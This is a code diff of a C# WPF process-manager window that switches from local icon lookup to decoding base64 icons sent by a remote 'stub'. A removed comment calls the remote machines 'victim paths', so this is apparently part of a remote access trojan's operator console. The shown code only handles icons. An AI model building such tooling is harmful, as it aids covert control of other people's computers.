@@ -226,13 +226,13 @@ public partial class ProcessManagerWindow : ThemedWindow
                 TxtStatus.Foreground = (Brush)FindResource("FieldLabelBrush");
             });
 
-            // Phase 2: load icons in background, then push batch to UI thread
+            // Phase 2: decode per-app icons sent inline by stub (cached on stub side per exe path)
             var iconBatch = new System.Collections.Generic.List<(int Pid, BitmapSource Icon)>();
             foreach (var p in d.Processes)
             {
-                if (!string.IsNullOrEmpty(p.ExePath))
+                if (!string.IsNullOrEmpty(p.IconB64))
                 {
-                    var icon = GetIcon(p.ExePath);
+                    var icon = DecodeIcon(p.IconB64);
                     if (icon != null)
                         iconBatch.Add((p.Pid, icon));
                 }
@@ -358,50 +358,22 @@ public partial class ProcessManagerWindow : ThemedWindow
         }
     }
 
-    [System.Runtime.InteropServices.DllImport("shell32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
-    private static extern nint SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSFI, uint uFlags);
-    [System.Runtime.InteropServices.DllImport("user32.dll")]
-    private static extern bool DestroyIcon(nint hIcon);
-    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
-    private struct SHFILEINFO { public nint hIcon; public int iIcon; public uint dwAttributes; [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 260)] public string szDisplayName; [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 80)] public string szTypeName; }
-    private const uint SHGFI_ICON           = 0x100;
-    private const uint SHGFI_SMALLICON      = 0x001;
-    private const uint SHGFI_USEFILEATTRIBS = 0x010;
-    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
-
-    private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, BitmapSource?> _iconCache = new();
-
-    private static BitmapSource? GetIcon(string path)
+    private static BitmapSource? DecodeIcon(string b64)
     {
-        var ext = string.IsNullOrEmpty(path) ? ".exe" : (System.IO.Path.GetExtension(path) is { Length: > 0 } e ? e : ".exe");
-        if (_iconCache.TryGetValue(ext, out var cached)) return cached;
-
-        BitmapSource? result = null;
+        if (string.IsNullOrEmpty(b64)) return null;
         try
         {
-            // ExtractAssociatedIcon requires the file to exist on the local machine — it will
-            // always fail for victim paths. Go straight to SHGetFileInfo with USEFILEATTRIBUTES
-            // which resolves icon by extension without touching the filesystem.
-            var fakeName = "file" + ext;
-            var sfi = new SHFILEINFO();
-            if (SHGetFileInfo(fakeName, FILE_ATTRIBUTE_NORMAL, ref sfi,
-                (uint)System.Runtime.InteropServices.Marshal.SizeOf<SHFILEINFO>(),
-                SHGFI_ICON | SHGFI_SMALLICON | SHGFI_USEFILEATTRIBS) != 0 && sfi.hIcon != 0)
-            {
-                try
-                {
-                    result = System.Windows.Interop.Imaging.CreateBitmapSourceFromHIcon(
-                        sfi.hIcon, Int32Rect.Empty, BitmapSizeOptions.FromEmptyOptions());
-                    result?.Freeze();
-                }
-                finally { DestroyIcon(sfi.hIcon); }
-            }
+            var bytes = Convert.FromBase64String(b64);
+            using var ms = new System.IO.MemoryStream(bytes);
+            var bmp = new BitmapImage();
+            bmp.BeginInit();
+            bmp.CacheOption  = BitmapCacheOption.OnLoad;
+            bmp.StreamSource = ms;
+            bmp.EndInit();
+            bmp.Freeze();
+            return bmp;
         }
-        catch { }
-
-        _iconCache[ext] = result;
-        if (_iconCache.Count > 200) _iconCache.Clear();
-        return result;
+        catch { return null; }
     }
 
     private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
